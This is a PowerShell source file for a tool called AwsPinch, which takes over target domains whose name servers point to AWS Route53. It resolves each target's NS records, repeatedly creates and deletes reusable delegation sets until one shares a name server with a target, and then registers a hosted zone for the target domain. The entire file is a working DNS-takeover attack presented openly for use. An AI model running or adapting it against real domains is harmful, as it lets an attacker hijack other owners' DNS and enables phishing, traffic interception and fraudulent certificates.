#AwsPinch - Try and take over a target site whose name server records are in AWS Delegation Sets (DS) in Route53

Function Find-AwsPinch {
  [CmdletBinding()]
  param (
    [Parameter(HelpMessage = "List of target domain names, separated by commas")]
    [string[]]$Targets,
    [Parameter(HelpMessage = "The DNS server for finding the NS records for your targets")]
    [string]$Server = "8.8.8.8",
    [Parameter(HelpMessage = "Do you want to cache unsuccessful name server records?")]
    [switch]$Cache,
    [Parameter(HelpMessage = "Do you want to run in parallel?")]
    [switch]$Parallel
  )
  # Params: Server, Targets, Cache, Parallel
  if (-not (Get-AwsCredential)) { throw "You are not logged in to AWS - use Set-AwsCredential." }
  $matchServers = @()
  $serverDict = @{}
  # First argument is the endpoint.
  foreach ($targetsite in $Targets) {
    if ( $null -eq $targetsite -or $targetsite.Length -eq 0 ) { throw "Failed - no argument supplied" }
    $servers = ( Resolve-DnsName -Type NS $targetsite -Server $Server | Where-Object section -eq 'Answer' ).NameHost
    if ( $servers -notmatch 'awsdns' ) { throw "Failed - servers for $targetsite aren't at AWS" }
    $matchServers += $servers
    # TODO: Potentially, this could collide. Make $serverDict[server] be a list.
    foreach ($server in $matchServers) { $serverDict[$server] = $targetsite }
  }

  # Caller reference requires to be different each time. 5 random letters, plus a number, is what I choose.
  $randprefix = -join ( 'a'..'z' | Get-Random -Count 5 )

  # Check against existing cache.
  $cachedDS = Get-R53ReusableDelegationSetList
  $takeover = @()
  ForEach ($q in $cachedDS) {
    $qq = Compare-Object $q.NameServers $matchServers -ExcludeDifferent
    foreach ($server in $qq.InputObject) {
      if ($serverDict.ContainsKey($server)) {
        $takeover += [PSCustomObject]@{
          Server = $server
          Id     = $q.Id
          Target = $serverDict[$server]
        }
      }
    }
  
  }

  if ($takeover.Count -eq 0) {

    $nomatch = $true
    $crumb = 1
    while ($nomatch) {
      Write-Progress "Try number $crumb"
      $q = (New-R53ReusableDelegationSet -CallerReference $randprefix$crumb).DelegationSet
      $qq = Compare-Object $q.NameServers $matchServers -ExcludeDifferent
      if ( $qq.Count -ne 0 ) {
        foreach ($server in $qq.InputObject) {
          if ($serverDict.ContainsKey($server)) {
            $takeover += [PSCustomObject]@{
              Server = $server
              Id     = $q.Id
              Target = $serverDict[$server]
            }
          }
        }
        break;
      }
      if (-not $Cache) {
        Remove-R53ReusableDelegationSet -Id $q.Id -Confirm:$false
      }
      $crumb++
    }

  }

  if ($takeover.Count -ne 0) {
    foreach ($q in $takeover) {
      New-R53HostedZone -Name $q.Target -CallerReference $($randprefix)Success -DelegationSetId $q.Id
    }
  }
}
